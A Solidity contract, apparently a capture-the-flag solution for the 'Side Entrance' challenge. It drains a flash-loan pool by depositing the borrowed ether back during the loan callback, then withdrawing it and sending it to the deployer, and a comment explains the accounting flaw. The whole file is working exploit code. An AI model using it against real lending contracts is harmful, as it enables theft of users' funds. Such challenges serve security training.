// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
  using Address for address payable;

  SideEntranceLenderPool immutable pool;
  address payable immutable attacker;

  constructor (address poolAddr) {
    pool = SideEntranceLenderPool(poolAddr);
    attacker = payable(msg.sender);
  }

  function execute() external override payable {
    pool.deposit{value: msg.value}();
  }
  
  function exploit() external {
    // By getting a flash loan and then depositing the value at the pool again,
    // our addresses' stored balance changes, while the balance of the pool doesn't,
    // so the flash loan will be successful and it will be possible to freely withdraw
    // the same amount that was borrowed.

    pool.flashLoan(address(pool).balance);
    pool.withdraw();
    attacker.sendValue(address(this).balance);
  }
  
  receive() external payable {}
}